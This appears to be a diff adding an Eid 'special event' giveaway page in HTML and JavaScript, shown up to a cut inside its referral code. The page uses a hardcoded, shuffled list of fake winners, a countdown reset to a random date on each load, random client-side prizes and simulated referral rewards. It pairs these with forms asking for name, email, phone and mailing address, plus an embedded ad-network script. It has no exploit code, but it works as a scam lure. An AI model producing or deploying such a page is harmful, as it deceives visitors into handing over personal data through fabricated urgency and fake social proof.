@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EID SPECIAL EVENT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lobster&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #eef1f5;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 50px;
+        }
+
+        #main-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            width: 95%;
+            max-width: 750px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        #event-header {
+            background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%);
+            color: white;
+            padding: 25px 20px;
+            border-radius: 10px 10px 0 0;
+            margin: -20px -20px 20px -20px;
+        }
+        #event-header h1 {
+            font-family: 'Lobster', cursive;
+            margin: 0 0 10px 0;
+            font-size: 3.2em;
+            font-weight: normal;
+            text-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+            letter-spacing: 2px;
+        }
+        #countdown-timer {
+            font-size: 1.2em; background-color: rgba(0,0,0,0.25); padding: 10px 15px; border-radius: 5px; display: inline-block;
+        }
+
+        h2, h3 { color: #2c3e50; }
+
+        button {
+            background-color: #e74c3c; 
+            color: white; border: none; padding: 12px 20px;
+            border-radius: 6px; cursor: pointer; font-size: 1.05em;
+            margin: 8px 5px;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+        }
+        button:hover { background-color: #c0392b; }
+        button:active { transform: scale(0.98); }
+        button:disabled { background-color: #bdc3c7; cursor: not-allowed; }
+
+        input[type="text"], input[type="email"], input[type="tel"], textarea {
+            padding: 12px; margin: 8px 0 15px 0; border: 1px solid #ccc;
+            border-radius: 6px; width: calc(100% - 26px); box-sizing: border-box;
+        }
+
+        #user-stats p, #dice-area p, #scratch-card-area p, #prize-display-area p {
+            font-size: 1.1em; margin: 10px 0;
+        }
+        #dice-result { font-weight: bold; color: #d35400; font-size: 1.3em; min-height: 30px; }
+
+        #scratch-card-area {
+            margin-top: 20px; padding: 15px; border: 2px dashed #e67e22;
+            background-color: #fdf6e3; border-radius: 8px;
+        }
+        #scratch-card-container {
+            width: 250px; height: 120px; margin: 10px auto; position: relative;
+            border: 1px solid #aaa;
+        }
+        #scratch-canvas { display: block; cursor: crosshair; }
+        #scratch-content-behind {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 1.1em; padding: 5px; box-sizing: border-box;
+            color: #1a5276; background-color: #eafaf1; border-radius: inherit;
+        }
+
+        #prize-display-area {
+            margin-top: 20px; padding: 20px; border: 2px solid #27ae60;
+            background-color: #e8f8f5; border-radius: 8px; position: relative;
+        }
+        #win-gift-box { width: 150px; height: auto; margin-bottom: 10px; }
+        #prize-won-text { font-size: 1.5em; font-weight: bold; color: #27ae60; }
+
+        .section-divider { margin: 30px 0; border-bottom: 1px solid #ddd; }
+
+        #collect-dice-options > div, #prize-registration-section {
+            margin-bottom: 25px; padding: 15px; border: 1px solid #e0e0e0;
+            border-radius: 8px; background-color: #f9f9f9;
+        }
+        #prize-registration-section button { background-color: #f39c12; }
+        #prize-registration-section button:hover { background-color: #e67e22; }
+        
+        #referral-section .referral-tier { margin-bottom: 15px; }
+        #referral-section .referral-tier button { margin-top: 5px; }
+        .claim-dice-button { background-color: #2ecc71; }
+        .claim-dice-button:hover { background-color: #27ae60; }
+
+        #runner-game-container {
+            position: relative; width: 400px; height: 200px; margin: 10px auto;
+            border: 2px solid #333; overflow: hidden; background-color: #87CEEB; /* Sky blue fallback */
+        }
+        #runnerGameCanvas {
+            display: block; /* Remove extra space below canvas if any */
+            /* Position is not needed if it's the only direct child filling the container */
+        }
+        #runner-game-score-display { font-weight: bold; }
+
+        #collect-prize-form, #user-received-prize-form-container {
+            background-color: #f0f5f9; padding: 20px; border-radius: 8px;
+            margin-top: 15px; border: 1px solid #ccd1d9;
+        }
+        #form-message, #user-received-form-message { font-weight: bold; margin-top: 10px; }
+
+        #recent-winners-section {
+            margin-top: 30px; background-color: #fdfefe; padding: 20px;
+            border-radius: 8px; border: 1px solid #e0e0e0;
+        }
+        #winners-list { list-style-type: none; padding: 0; max-height: 250px; overflow-y: auto; }
+        #winners-list li {
+            background-color: #eaf2f8; padding: 10px; margin-bottom: 8px;
+            border-radius: 4px; border-left: 5px solid #e74c3c; text-align: left;
+        }
+        #winners-list li strong { color: #c0392b; }
+
+        .firework-particle {
+            position: absolute; width: 6px; height: 6px;
+            border-radius: 50%; opacity: 0;
+            animation: burst 1s ease-out forwards;
+            pointer-events: none;
+        }
+        @keyframes burst {
+            0% { transform: scale(0.3) translate(0, 0); opacity: 1; }
+            50% { opacity: 0.8; }
+            100% { transform: scale(1.2) translate(var(--tx), var(--ty)); opacity: 0; }
+        }
+
+        .modal {
+            display: none; position: fixed; z-index: 1001; left: 0; top: 0;
+            width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5);
+            padding-top: 60px;
+        }
+        .modal-content {
+            background-color: #fefefe; margin: 5% auto; padding: 25px;
+            border: 1px solid #888; width: 80%; max-width: 500px;
+            border-radius: 10px; text-align: center;
+        }
+        .close-button {
+            color: #aaa; float: right; font-size: 28px; font-weight: bold;
+        }
+        .close-button:hover, .close-button:focus {
+            color: black; text-decoration: none; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div style="width: 100%; display: flex; justify-content: center; margin-top: 10px;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'ee078fbb754e72aacdd66129a692543e',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="//www.highperformanceformat.com/ee078fbb754e72aacdd66129a692543e/invoke.js"></script>
+</div>
+
+
+    <div id="main-container">
+        <div id="event-header">
+            <h1>EID SPECIAL EVENT</h1>
+            <div id="countdown-timer">Event Ends In: Loading...</div>
+        </div>
+
+        <div id="user-stats">
+            <p>Available Dice: <span id="dice-count">5</span></p>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <div id="dice-area">
+            <button id="roll-dice-button">Roll Dice!</button>
+            <p id="dice-result">Roll the dice to try your luck!</p>
+        </div>
+
+        <div id="scratch-card-area" style="display:none;">
+            <h2>Scratch Card!</h2>
+            <div id="scratch-card-container">
+                <div id="scratch-content-behind"></div>
+                <canvas id="scratch-canvas" width="250" height="120"></canvas>
+            </div>
+            <p id="scratch-instructions">Scratch the card to reveal your prize!</p>
+        </div>
+
+        <div id="prize-display-area" style="display:none;">
+            <img src="original_image.png" alt="Gift Box" id="win-gift-box" 
+                 onerror="this.alt='Winning Gift Box!'; this.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';"> 
+            <p id="prize-won-text"></p>
+        </div>
+        
+        <div id="collect-prize-form" style="display:none;">
+            <h3>Collect Your Prize</h3>
+            <input type="text" id="collect-user-name" placeholder="Your Name">
+            <input type="email" id="collect-user-email" placeholder="Your Email">
+            <input type="tel" id="collect-user-phone" placeholder="Your Phone Number">
+            <textarea id="collect-user-address" placeholder="Your Full Mailing Address" rows="3"></textarea>
+            <button id="submit-contact-button">Submit Details</button>
+            <p id="form-message"></p>
+        </div>
+
+        <div class="section-divider"></div>
+
+        <div id="collect-dice-options">
+            <h2>Get More Dice!</h2>
+            <div id="runner-game-section">
+                <h3>1. Play Runner Game for Dice</h3>
+                <div id="runner-game-container">
+                    <canvas id="runnerGameCanvas" width="400" height="200"></canvas>
+                </div>
+                <p>Score: <span id="runner-game-score-display">0</span>. Reach 2000 points for 2 Dice!</p>
+                <p id="runner-game-status">Click "Start Game" to play. Use Spacebar or Tap to Jump.</p>
+                <button id="start-runner-game-button">Start Game</button>
+            </div>
+
+            <div id="prize-registration-section">
+                <h3>Prize Eligibility</h3>
+                <p>Register your details to be eligible for prize draws.</p>
+                <button id="open-prize-registration-modal-button">Register Your Details</button>
+            </div>
+
+            <div id="referral-section">
+                <h3>2. Refer Friends for Dice</h3>
+            </div>
+        </div>
+
+        <div class="section-divider"></div>
+        
+        <div id="recent-winners-section">
+            <h2>Recent Winners 🏆</h2>
+            <ul id="winners-list"></ul>
+        </div>
+
+        <div class="section-divider"></div>
+        <button id="share-button">Share Event with Friends! 📲</button>
+    </div>
+
+    <!-- Modal for "User Received Prize" -->
+    <div id="user-received-prize-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-button" id="close-user-received-modal">&times;</span>
+            <h3>Register Your Details</h3>
+            <div id="user-received-prize-form-container">
+                <input type="text" id="reg-user-name" placeholder="Your Full Name">
+                <input type="email" id="reg-user-email" placeholder="Your Email Address">
+                <input type="tel" id="reg-user-phone" placeholder="Your Phone Number">
+                <textarea id="reg-user-address" placeholder="Your Full Mailing Address" rows="3"></textarea>
+                <button id="submit-registration-button">Register</button>
+                <p id="user-received-form-message"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- DOM Elements ---
+        const diceCountEl = document.getElementById('dice-count');
+        const rollDiceButton = document.getElementById('roll-dice-button');
+        const diceResultEl = document.getElementById('dice-result');
+        const scratchCardArea = document.getElementById('scratch-card-area');
+        const scratchCanvas = document.getElementById('scratch-canvas');
+        const scratchCtx = scratchCanvas.getContext('2d');
+        const scratchContentBehindEl = document.getElementById('scratch-content-behind');
+        const prizeDisplayArea = document.getElementById('prize-display-area');
+        const prizeWonTextEl = document.getElementById('prize-won-text');
+        const collectPrizeForm = document.getElementById('collect-prize-form');
+        const collectUserNameInput = document.getElementById('collect-user-name');
+        const collectUserEmailInput = document.getElementById('collect-user-email');
+        const collectUserPhoneInput = document.getElementById('collect-user-phone');
+        const collectUserAddressInput = document.getElementById('collect-user-address');
+        const submitContactButton = document.getElementById('submit-contact-button');
+        const formMessageEl = document.getElementById('form-message');
+        const runnerGameCanvas = document.getElementById('runnerGameCanvas');
+        const runnerGameCtx = runnerGameCanvas.getContext('2d');
+        const runnerGameScoreDisplayEl = document.getElementById('runner-game-score-display');
+        const startRunnerGameButton = document.getElementById('start-runner-game-button');
+        const runnerGameStatusEl = document.getElementById('runner-game-status');
+        const referralSectionEl = document.getElementById('referral-section');
+        const shareButton = document.getElementById('share-button');
+        const countdownTimerEl = document.getElementById('countdown-timer');
+        const winnersListEl = document.getElementById('winners-list');
+        const openPrizeRegistrationModalButton = document.getElementById('open-prize-registration-modal-button');
+        const userReceivedPrizeModal = document.getElementById('user-received-prize-modal');
+        const closeUserReceivedModalButton = document.getElementById('close-user-received-modal');
+        const regUserNameInput = document.getElementById('reg-user-name');
+        const regUserEmailInput = document.getElementById('reg-user-email');
+        const regUserPhoneInput = document.getElementById('reg-user-phone');
+        const regUserAddressInput = document.getElementById('reg-user-address');
+        const submitRegistrationButton = document.getElementById('submit-registration-button');
+        const userReceivedFormMessageEl = document.getElementById('user-received-form-message');
+
+        // --- Game State & Config ---
+        let diceCount = 5;
+        const LUCKY_NUMBER_FOR_SCRATCH_CARD = 6;
+        let runnerGameActive = false;
+        let runnerGameScore = 0;
+        let runnerGameLoopId; // For requestAnimationFrame
+
+        const prizeListForJS = [
+            { name: "Grand Prize: Eid Shopping Spree (৳50,000) 🛍️", isGrand: true }, { name: "Grand Prize: Latest Smartphone 📱", isGrand: true },
+            { name: "Grand Prize: 4K Smart TV 📺", isGrand: true }, { name: "Premium Wireless Earbuds 🎧", isGrand: false },
+            { name: "Smartwatch Fitness Tracker ⌚", isGrand: false }, { name: "৳5000 Gift Voucher 💳", isGrand: false },
+            { name: "Bluetooth Soundbar 🔊", isGrand: false }, { name: "Large Capacity Power Bank 🔋", isGrand: false },
+            { name: "Eid Special Dinner Set 🍽️", isGrand: false }, { name: "Gaming Keyboard & Mouse Combo 🖱️", isGrand: false },
+            { name: "20 Extra Dice! 🎲", isGrand: false }, { name: "Luxury Eid Gift Basket 🧺", isGrand: false }
+        ];
+        const referralTiersForJS = [
+            { friends: 3, dice: 2, id: 'ref3' }, { friends: 5, dice: 5, id: 'ref5' }, { friends: 10, dice: 12, id: 'ref10' },
+            { friends: 20, dice: 25, id: 'ref20' }, { friends: 50, dice: 65, id: 'ref50' }, { friends: 100, dice: 100, id: 'ref100' }
+        ];
+        let claimedReferrals = {};
+
+        // --- Runner Game (Shadow Man) Specifics ---
+        const PLAYER_GAME_SCORE_MILESTONE = 2000;
+        const PLAYER_GAME_DICE_REWARD = 2;
+        let player = { 
+            x: 50, y: runnerGameCanvas.height - 40 - 10, 
+            width: 15, height: 40, color: '#333', // Shadow Man
+            dy: 0, gravity: 0.4, jumpPower: -9.5, // Further lowered difficulty
+            isJumping: false, onGround: true 
+        };
+        const playerObstacles = [];
+        let playerObstacleSpawnTimer = 0;
+        const PLAYER_OBSTACLE_SPAWN_INTERVAL_INITIAL = 250; // Even Slower obstacle spawn
+        let currentPlayerObstacleSpawnInterval = PLAYER_OBSTACLE_SPAWN_INTERVAL_INITIAL;
+        let playerObstacleSpeed = 1.5; // Even Slower initial obstacle speed
+        const GROUND_Y = runnerGameCanvas.height - 10; 
+
+        // --- Parallax Background for Runner Game ---
+        const bgLayers = [
+            { color: '#2c3e50', speedModifier: 0.08, minH: 60, maxH: 120, minW: 20, maxW: 40, density: 0.2, items: [] },
+            { color: '#34495e', speedModifier: 0.15, minH: 50, maxH: 100, minW: 25, maxW: 50, density: 0.3, items: [] },
+            { color: '#566573', speedModifier: 0.25, minH: 40, maxH: 80,  minW: 30, maxW: 60, density: 0.4, items: [] }
+        ];
+
+        function initParallaxLayers() {
+            bgLayers.forEach(layer => {
+                layer.items = []; let currentX = 0;
+                while (currentX < runnerGameCanvas.width * 2.5) { // Populate more for very slow layers
+                    if (Math.random() < layer.density) {
+                        const height = Math.random() * (layer.maxH - layer.minH) + layer.minH;
+                        const width = Math.random() * (layer.maxW - layer.minW) + layer.minW;
+                        layer.items.push({ x: currentX, y: GROUND_Y - height, width: width, height: height });
+                    }
+                    currentX += Math.random() * 80 + 40; // Wider random spacing
+                }
+            });
+        }
+
+        function drawParallaxBackground() {
+            runnerGameCtx.fillStyle = '#87CEEB'; // Sky Blue
+            runnerGameCtx.fillRect(0, 0, runnerGameCanvas.width, runnerGameCanvas.height);
+            bgLayers.forEach(layer => {
+                runnerGameCtx.fillStyle = layer.color;
+                layer.items.forEach(item => { runnerGameCtx.fillRect(item.x, item.y, item.width, item.height); });
+            });
+        }
+
+        function updateParallaxBackground() {
+            bgLayers.forEach(layer => {
+                layer.items.forEach(item => { item.x -= playerObstacleSpeed * layer.speedModifier; });
+                layer.items = layer.items.filter(item => item.x + item.width > 0);
+                let lastItemX = layer.items.length > 0 ? layer.items[layer.items.length - 1].x + layer.items[layer.items.length - 1].width : 0;
+                while (lastItemX < runnerGameCanvas.width * 2) {
+                    if (Math.random() < layer.density) {
+                        const spacing = Math.random() * 80 + 40;
+                        const height = Math.random() * (layer.maxH - layer.minH) + layer.minH;
+                        const width = Math.random() * (layer.maxW - layer.minW) + layer.minW;
+                        layer.items.push({ x: lastItemX + spacing, y: GROUND_Y - height, width: width, height: height });
+                        lastItemX += spacing + width;
+                    } else { // Add some empty space if density check fails
+                        lastItemX += Math.random() * 50 + 20;
+                    }
+                     if (layer.items.length > 30) break; // Prevent infinite loop for dense, slow layers
+                }
+            });
+        }
+        
+        // --- UI Update ---
+        function updateDiceCountUI() { diceCountEl.textContent = diceCount; rollDiceButton.disabled = diceCount <= 0; }
+
+        // --- Countdown Timer ---
+        function startCountdown() {
+            const eventEndDate = new Date();
+            eventEndDate.setDate(eventEndDate.getDate() + Math.floor(Math.random()*10) + 15); // Min 15 days
+            eventEndDate.setHours(Math.floor(Math.random()*24)); eventEndDate.setMinutes(Math.floor(Math.random()*60)); eventEndDate.setSeconds(Math.floor(Math.random()*60));
+            function updateTimer() {
+                const now = new Date().getTime(); const distance = eventEndDate - now;
+                if (distance < 0) { countdownTimerEl.textContent = "EVENT ENDED"; rollDiceButton.disabled = true; startRunnerGameButton.disabled = true; return; }
+                const d = Math.floor(distance/(1e3*60*60*24)), h = Math.floor((distance%(1e3*60*60*24))/(1e3*60*60));
+                const m = Math.floor((distance%(1e3*60*60))/(1e3*60)), s = Math.floor((distance%(1e3*60))/1e3);
+                countdownTimerEl.textContent = `Ends In: ${d}d ${h}h ${m}m ${s}s`;
+                if(document.hidden) return; // Don't update if tab is not visible
+                requestAnimationFrame(updateTimer);
+            }
+            updateTimer();
+        }
+        
+        // --- Recent Winners ---
+        function populateWinnersList() {
+            const sampleWinners = [
+                { name: "Abdullah Al Mamun", prize: "Eid Shopping Voucher ৳15000" }, { name: "Fatima Akter", prize: "Samsung Galaxy A55" },
+                { name: "Rizwan Khan", prize: "Sony 4K TV 43\"" }, { name: "Sumaiya Islam", prize: "Premium Bluetooth Headphones" },
+                { name: "Tariq Ahmed", prize: "৳3000 bKash Cashback" }, { name: "Nadia Chowdhury", prize: "Exclusive Eid Saree" },
+                { name: "Zayn Hasan", prize: "Smart Fitness Band" }, { name: "Ishrat Jahan", prize: "Luxury Perfume Set" },
+                { name: "Mehedi Hasan", prize: "Gaming Mouse & Keyboard" }, { name: "Ayesha Siddiqua", prize: "৳1000 Mobile Recharge" },
+                { name: "Kamal Uddin", prize: "Dinner Set for Family" }, { name: "Sabiha Noor", prize: "Power Bank 20000mAh" }
+            ];
+            winnersListEl.innerHTML = ''; const shuffled = sampleWinners.sort(() => .5 - Math.random());
+            shuffled.forEach(w => { const li = document.createElement('li'); li.innerHTML = `<strong>${w.name}</strong> won ${w.prize}! 🎉`; winnersListEl.appendChild(li); });
+        }
+
+        // --- Dice Rolling ---
+        rollDiceButton.addEventListener('click', () => {
+            if (diceCount <= 0) return; diceCount--; updateDiceCountUI(); rollDiceButton.disabled = true;
+            hideScratchCard(); prizeDisplayArea.style.display = 'none'; collectPrizeForm.style.display = 'none'; formMessageEl.textContent = '';
+            let flashCount = 0; const maxFlashes = 8;
+            const flashInterval = setInterval(() => {
+                diceResultEl.textContent = `Rolling... ${Math.floor(Math.random() * 6) + 1} 🎲`;
+                if (++flashCount >= maxFlashes) {
+                    clearInterval(flashInterval); const roll = Math.floor(Math.random() * 6) + 1;
+                    if (roll === LUCKY_NUMBER_FOR_SCRATCH_CARD) {
+                        diceResultEl.textContent = `You rolled a ${roll}! 🎉 Lucky Number! You get a Scratch Card!`; showScratchCard();
+                    } else { diceResultEl.textContent = `You rolled a ${roll}. No scratch card this time. Keep trying!`; }
+                    rollDiceButton.disabled = diceCount <= 0;
+                }
+            }, 100);
+        });
+
+        // --- Scratch Card ---
+        let scratchCardRevealed = false, scratchIsScratching = false;
+        function setupScratchCardSurface() {
+            scratchCtx.globalCompositeOperation = 'source-over'; scratchCtx.fillStyle = '#bdc3c7'; scratchCtx.fillRect(0, 0, scratchCanvas.width, scratchCanvas.height);
+            scratchCtx.font = 'bold 18px Arial'; scratchCtx.fillStyle = '#2c3e50'; scratchCtx.textAlign = 'center'; scratchCtx.textBaseline = 'middle';
+            scratchCtx.fillText('SCRATCH HERE', scratchCanvas.width / 2, scratchCanvas.height / 2); scratchCardRevealed = false;
+        }
+        function getScratchPos(canvasElem, event) {
+            const rect = canvasElem.getBoundingClientRect();
+            if (event.touches && event.touches.length > 0) { return { x: event.touches[0].clientX - rect.left, y: event.touches[0].clientY - rect.top }; }
+            return { x: event.clientX - rect.left, y: event.clientY - rect.top };
+        }
+        function scratchDraw(e) {
+            if (!scratchIsScratching) return; const pos = getScratchPos(scratchCanvas, e);
+            scratchCtx.globalCompositeOperation = 'destination-out'; scratchCtx.beginPath(); scratchCtx.arc(pos.x, pos.y, 15, 0, Math.PI * 2, false); scratchCtx.fill();
+            e.preventDefault(); // Important for touchmove
+        }
+        scratchCanvas.addEventListener('mousedown', (e) => { scratchIsScratching = true; scratchDraw(e); });
+        scratchCanvas.addEventListener('touchstart', (e) => { scratchIsScratching = true; scratchDraw(e); });
+        scratchCanvas.addEventListener('mousemove', scratchDraw);
+        scratchCanvas.addEventListener('touchmove', scratchDraw);
+        scratchCanvas.addEventListener('mouseup', () => { scratchIsScratching = false; checkScratchCardProgress(); });
+        scratchCanvas.addEventListener('touchend', () => { scratchIsScratching = false; checkScratchCardProgress(); });
+        scratchCanvas.addEventListener('mouseleave', () => { if(scratchIsScratching) {scratchIsScratching = false; checkScratchCardProgress();} });
+        function checkScratchCardProgress() {
+            if (scratchCardRevealed) return; const imageData = scratchCtx.getImageData(0, 0, scratchCanvas.width, scratchCanvas.height);
+            const pixels = imageData.data; let transparentPixels = 0;
+            for (let i = 3; i < pixels.length; i += 4) { if (pixels[i] < 128) { transparentPixels++; } }
+            if (transparentPixels / (scratchCanvas.width * scratchCanvas.height) > 0.7) {
+                scratchCardRevealed = true; scratchCtx.clearRect(0, 0, scratchCanvas.width, scratchCanvas.height); processScratchCardResult();
+            }
+        }
+        function showScratchCard() {
+            scratchCardArea.style.display = 'block'; setupScratchCardSurface();
+            const isWin = Math.random() < 0.15; // 15% win
+            if (isWin) {
+                const selectedPrize = prizeListForJS[Math.floor(Math.random() * prizeListForJS.length)];
+                scratchContentBehindEl.innerHTML = `🥳 Congratulations! <br>You won: <br><strong>${selectedPrize.name}</strong>`;
+                scratchCardArea.dataset.prizeName = selectedPrize.name; scratchCardArea.dataset.prizeIsGrand = selectedPrize.isGrand;
+            } else { scratchContentBehindEl.innerHTML = `😢 Sorry, an Empty Box! 🎁 <br>Better luck next time!`; scratchCardArea.dataset.prizeName = "empty"; }
+        }
+        function processScratchCardResult() {
+            const prizeName = scratchCardArea.dataset.prizeName;
+            if (prizeName && prizeName !== "empty") { setTimeout(() => { hideScratchCard(); displayWin({name: prizeName, isGrand: scratchCardArea.dataset.prizeIsGrand === "true"}); }, 1500); }
+            else { setTimeout(() => { hideScratchCard(); }, 2500); }
+        }
+        function hideScratchCard() { scratchCardArea.style.display = 'none'; }
+
+        // --- Winning Display ---
+        function displayWin(prize) {
+            prizeDisplayArea.style.display = 'block'; prizeWonTextEl.innerHTML = `You've Won: <br><strong>${prize.name}</strong>`; triggerFireworks(prizeDisplayArea);
+            collectPrizeForm.style.display = 'block'; collectUserNameInput.value = ''; collectUserEmailInput.value = ''; collectUserPhoneInput.value = ''; collectUserAddressInput.value = '';
+            formMessageEl.textContent = '';
+        }
+        function triggerFireworks(container) {
+            const existing = container.querySelectorAll('.firework-particle'); existing.forEach(p=>p.remove());
+            for (let i=0; i<30; i++) {
+                const p=document.createElement('div'); p.classList.add('firework-particle');
+                const colors=['gold','red','#0f0','blue','purple','orange','pink']; p.style.backgroundColor=colors[Math.floor(Math.random()*colors.length)];
+                p.style.left='50%'; p.style.top='50%'; const angle=Math.random()*2*Math.PI; const dist=Math.random()*120+80;
+                p.style.setProperty('--tx',(Math.cos(angle)*dist)+'px'); p.style.setProperty('--ty',(Math.sin(angle)*dist)+'px');
+                p.style.animationDelay=(Math.random()*0.3)+'s'; container.appendChild(p); p.addEventListener('animationend',()=>p.remove());
+            }
+        }
+        submitContactButton.addEventListener('click', () => {
+            const name = collectUserNameInput.value.trim(), email = collectUserEmailInput.value.trim();
+            const phone = collectUserPhoneInput.value.trim(), address = collectUserAddressInput.value.trim();
+            if (name && (email || phone) && address) {
+                formMessageEl.textContent = "Thank you! Your details have been submitted."; formMessageEl.style.color = "#2ecc71";
+                setTimeout(() => { collectPrizeForm.style.display = 'none'; prizeDisplayArea.style.display = 'none'; formMessageEl.textContent = ''; }, 3500);
+            } else { formMessageEl.textContent = "Please fill all fields: Name, Address, and Email or Phone."; formMessageEl.style.color = "red"; setTimeout(() => { formMessageEl.textContent = ''; }, 3000); }
+        });
+
+        // --- Runner Game (Shadow Man) ---
+        function drawPlayer() { 
+            runnerGameCtx.fillStyle = player.color;
+            runnerGameCtx.fillRect(player.x, player.y, player.width, player.height);
+        }
+        function drawGroundLine() { runnerGameCtx.fillStyle = '#3a2e29'; runnerGameCtx.fillRect(0, GROUND_Y, runnerGameCanvas.width, runnerGameCanvas.height - GROUND_Y); }
+        function drawPlayerObstacles() {
+            runnerGameCtx.fillStyle = '#2ecc71'; // Green for obstacles
+            playerObstacles.forEach(obstacle => { runnerGameCtx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height); });
+        }
+        function updatePlayer() {
+            player.y += player.dy; player.dy += player.gravity; player.onGround = false;
+            if (player.y + player.height >= GROUND_Y) { player.y = GROUND_Y - player.height; player.dy = 0; player.isJumping = false; player.onGround = true; }
+        }
+        function updatePlayerObstacles() {
+            playerObstacleSpawnTimer++;
+            if (playerObstacleSpawnTimer >= currentPlayerObstacleSpawnInterval) {
+                playerObstacleSpawnTimer = 0;
+                const obsHeight = Math.random() * (player.height - 10) + 15; // Obstacle height relative to player
+                const obsWidth = Math.random() * 8 + 12;
+                playerObstacles.push({ x: runnerGameCanvas.width, y: GROUND_Y - obsHeight, width: obsWidth, height: obsHeight });
+                if (currentPlayerObstacleSpawnInterval > 120) currentPlayerObstacleSpawnInterval -= 0.3; // Slower decrease
+                if (playerObstacleSpeed < 2.8) playerObstacleSpeed += 0.003; // Slower increase
+            }
+            playerObstacles.forEach(obstacle => obstacle.x -= playerObstacleSpeed);
+            if (playerObstacles.length > 0 && playerObstacles[0].x + playerObstacles[0].width < 0) {
+                playerObstacles.shift(); runnerGameScore += 100; runnerGameScoreDisplayEl.textContent = runnerGameScore;
+                if (runnerGameScore > 0 && runnerGameScore % PLAYER_GAME_SCORE_MILESTONE === 0) {
+                    diceCount += PLAYER_GAME_DICE_REWARD; updateDiceCountUI();
+                    runnerGameStatusEl.textContent = `🎉 ${PLAYER_GAME_DICE_REWARD} Dice earned! Keep going!`;
+                    setTimeout(()=> { if(runnerGameActive) runnerGameStatusEl.textContent = "Game in progress..."; }, 2000);
+                }
+            }
+        }
+        function checkPlayerCollisions() {
+            for (let obstacle of playerObstacles) {
+                if (player.x < obstacle.x + obstacle.width && player.x + player.width > obstacle.x &&
+                    player.y < obstacle.y + obstacle.height && player.y + player.height > obstacle.y) { return true; }
+            } return false;
+        }
+        function playerGameLoop() {
+            if (!runnerGameActive) return;
+            updateParallaxBackground(); drawParallaxBackground(); drawGroundLine();
+            updatePlayer(); updatePlayerObstacles(); drawPlayer(); drawPlayerObstacles();
+            if (checkPlayerCollisions()) {
+                runnerGameStatusEl.textContent = `Game Over! Score: ${runnerGameScore}. Click "Start Game" to try again.`;
+                runnerGameActive = false; startRunnerGameButton.disabled = false; cancelAnimationFrame(runnerGameLoopId); return;
+            }
+            runnerGameLoopId = requestAnimationFrame(playerGameLoop);
+        }
+        startRunnerGameButton.addEventListener('click', () => {
+            if (runnerGameActive) return; runnerGameActive = true; startRunnerGameButton.disabled = true;
+            runnerGameStatusEl.textContent = "Game in progress... Press Space or Tap to Jump!";
+            player.y = GROUND_Y - player.height; player.dy = 0; player.isJumping = false; player.onGround = true;
+            playerObstacles.length = 0; runnerGameScore = 0; runnerGameScoreDisplayEl.textContent = runnerGameScore;
+            playerObstacleSpawnTimer = 0; currentPlayerObstacleSpawnInterval = PLAYER_OBSTACLE_SPAWN_INTERVAL_INITIAL;
+            playerObstacleSpeed = 1.5; // Reset speed
+            initParallaxLayers();
+            if(runnerGameLoopId) cancelAnimationFrame(runnerGameLoopId);
+            runnerGameLoopId = requestAnimationFrame(playerGameLoop);
+        });
+        function playerJump() { if (runnerGameActive && player.onGround) { player.isJumping = true; player.onGround = false; player.dy = player.jumpPower; } }
+        document.addEventListener('keydown', (e) => { if (e.code === 'Space') { playerJump(); e.preventDefault();} });
+        runnerGameCanvas.addEventListener('click', playerJump);
+        runnerGameCanvas.addEventListener('touchstart', (e) => { playerJump(); e.preventDefault(); });
+
+        // --- Referral System ---
+        function renderReferralTiers() {
+            referralSectionEl.innerHTML = '<h3>2. Refer Friends for Dice</h3>';
+            referralTiersForJS.forEach(tier => {
+                const d = document.createElement('div'); d.className = 'referral-tier'; d.id = `tier-${tier.id}`;
+                let c = `Invite ${tier.friends} Friends to get ${tier.dice} Dice.`;
+                const ib = document.createElement('button'); ib.textContent = `Simulate Invite ${tier.friends}`; ib.dataset.tierId=tier.id; ib.onclick=handleInviteSimulation;
+                const cb = document.createElement('button'); cb.textContent=`Claim ${tier.dice} Dice`; cb.dataset.tierId=tier.id; cb.dataset.dice=tier.dice; cb.className='claim-dice-button'; cb.style.display='none'; cb.onclick=handleClaimReferralDice;
+                if (claimedReferrals[tier.id]) {c+=` (Claimed ${tier.dice} Dice)`; ib.disabled=true; cb.style.display='none';}
+                else if (sessionStorage.getItem(`invited-${tier.id}`)) {ib.disabled=true; cb.style.display='inline-block';}
+                d.innerHTML = `<p>${c}</p>`; d.appendChild(ib); d.appendChild(cb); referralSectionEl.appendChild(d);
+            });
+        }
+        function handleInviteSimulation(event) {
+            const tierId=event.target.dataset.tierId; event.target.disabled=true; sessionStorage.setItem(`invited-${tierId}`,'true');
+            const cb=document.querySelector(`#tier-${tierId} .claim-dice-button`); if(cb) cb.style.display='inline-block';
+            alert(`Simulation: You've "invited" enough friends for the ${tierId.replace('ref','')} friends tier. Now claim your dice!`);
+        }
+        function handleClaimReferralDice(event) {
+            const tierId=event.target.dataset.tierId; const diceToAdd=parseInt(event.target.dataset.dice);
+            if (!claimedReferrals[tierId]) {
+                diceCount+=diceToAdd; claimedReferrals[tierId]=true; sessionStorage.removeItem(`invited-${tierId}`); updateDiceCountUI();
